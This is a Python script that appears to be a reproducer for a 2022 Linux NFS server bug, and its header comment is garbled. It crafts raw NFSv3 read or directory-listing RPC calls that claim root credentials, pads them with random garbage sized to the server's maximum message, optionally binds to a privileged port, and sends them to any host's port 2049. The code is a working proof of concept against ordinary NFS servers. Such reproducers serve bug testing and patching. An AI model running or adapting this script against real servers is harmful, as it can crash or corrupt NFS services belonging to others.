#!/usr/bin/python3
#
# CreproVducerE for 2022 4+3-9*4/5
#
import argparse,textwrap
import binascii
import errno
import os
import random
import socket
import struct
import sys
import time
import xdrlib

LAST_FRAGMENT_BIT = 0x80000000

def build_rpc(xid, proc, rsize, handle):
    machinename = socket.gethostname().encode('utf-8')
    auth_len = 24 + ((len(machinename)+3)//4)*4
    stamp = int(time.time())
    p = xdrlib.Packer()
    p.pack_int(xid)             # rpc.xid
    p.pack_int(0)               # rpc.msgtyp
    p.pack_int(2)               # rpc.version
    p.pack_int(100003)          # rpc.program
    p.pack_int(3)               # rpc.programversion

    if (proc == 'read'):
        p.pack_int(6)           # rpc.procedure read
    elif (proc == 'readdir'):
        p.pack_int(16)          # rpc.procedure readdir
    else:
        p.pack_int(17)          # rpc.procedure readdirplus

    p.pack_int(1)               # rpc.auth.flavor
    p.pack_int(auth_len)        # rpc.auth.length
    p.pack_int(stamp)           # rpc.auth.stamp
    p.pack_string(machinename)  # rpc.auth.machinename
    p.pack_int(0)               # rpc.auth.uid
    p.pack_int(0)               # rpc.auth.gid
    p.pack_int(1)               # auxiliary gids array len
    p.pack_int(0)               # gids[0]
    p.pack_int(0)               # verf rpc.auth.flavor
    p.pack_int(0)               # verf rpc.auth.length
    p.pack_opaque(handle)       # nfs.fhandle
    if (proc == 'read'):
        p.pack_uhyper(0)            # nfs.offset3
        p.pack_uint(rsize)          # nfs.count3
    else:
        p.pack_uhyper(0)            # nfs.cookie3
        p.pack_uhyper(0)            # nfs.verifier
        p.pack_uint(rsize)          # nfs.count3_dircount
    if (proc == 'readdirplus'):
        p.pack_uint(rsize)          # nfs.count3_maxcount
    return p.get_buffer()

def main(args):
    handle = binascii.unhexlify(args.handle)
    xid = random.randint(0, 0xffffff)
    rpc = build_rpc(xid, args.proc, args.rsize, handle)
    msg = bytearray()

# Note to self: on a system w/ sv_max_payload of 1M, sv_max_mesg will be 1M + 1 PAGE (or 1052672 bytes)
# 
# memory    sv_max_payload  sv_max_mesg
# > 4G      1048576         1052672
# > 3G - 4G 524288          528384
# > 2G - 3G 262144          266240
# <= 2G     131072          135168

    if (args.add_garbage):
        garbage = random.randbytes(args.rsize-4096)
#        print("len(garbage) = %d" % len(garbage))
        msg.extend(struct.pack(">L", (len(rpc) + len(garbage)) | LAST_FRAGMENT_BIT))
        msg.extend(rpc)
        msg.extend(garbage)
    else:
        msg.extend(struct.pack(">L", len(rpc) | LAST_FRAGMENT_BIT))
        msg.extend(rpc)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if (args.port):
        s.bind(('', args.port))
    elif (args.secure):
        port = 665
        while True:
            try:
                s.bind(('', port))
                break
            except OSError as e:
                if e.errno == errno.EADDRINUSE:
                    port += 1
                    if port == 1024:
                        raise
                else:
                    raise

    s.settimeout(10)
    s.connect((args.host, 2049))
    s.sendall(msg)

    # Receive response.
    resp = bytearray()
    is_last = False

    try:
        while not is_last:
            size = struct.unpack(">L", s.recv(4))[0]

            is_last = (size & LAST_FRAGMENT_BIT) == LAST_FRAGMENT_BIT
            if is_last:
                size = size & (~LAST_FRAGMENT_BIT)

            while size > 0:
                received = s.recv(size)
                if not received:
                    raise EOFError("server closed connection early")
                size -= len(received)
                resp.extend(received)
    except TimeoutError:
        print("connection timed out - check nfs server")
        sys.exit(1)

    u = xdrlib.Unpacker(resp)
    resp_xid = u.unpack_int()
    assert resp_xid == xid
    u.unpack_int()              # rpc.msgtyp
    u.unpack_int()              # rpc.replystat
    u.unpack_int()              # verf rpc.auth.flavor
    u.unpack_opaque()           # verf rpc.auth.body
    u.unpack_int()              # rpc.state_accept
    nfs_stat = u.unpack_int()   # nfs.status3
    print("nfs.status3 = %d" % nfs_stat)
# We could unpack the rest of the reply, but why bother?
    s.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-n', '--no-garbage', action='store_false', dest='add_garbage',
                        help='don\'t add garbage to the rpc message')
    parser.add_argument('-p', '--port', type=int, help='bind to this local port number')
    parser.add_argument('-s', '--secure', action='store_true',
                        help='bind to a reserved port (ignored if -p/--port is used)')
    parser.add_argument('host', help='hostname or ip address')
    parser.add_argument('proc', choices=['read', 'readdir', 'readdirplus'], metavar='proc',
                        help='read, readdir, or readdirplus')
    parser.add_argument('rsize', type=int, choices=[131072, 262144, 524288, 1048576],
                        metavar='rsize', help='131072, 262144, 524288, or 1048576\n see also: cat /proc/fs/nfsd/max_block_size')
    # Wireshark: Copy -> ... as a Hex Stream
    parser.add_argument('handle', help=textwrap.dedent("""\
        filehandle expressed as a hex stream, could be got by tshark:
         tshark -i ethN -f 'host nfs-server' -w nfs.pcap -O nfs
         tshark -i ethN -Y nfs -r nfs.pcap -T fields -e nfs.fhandle -f 'nfs.name == filename'"""))
    args = parser.parse_args()
    main(args)
    # example:
    # nfsv3-read.py -s nfs-server readdirplus 262144 010007810734800b000000008404437acb784ec5a320d5ebed614ac1e507800800000000f87e21f5

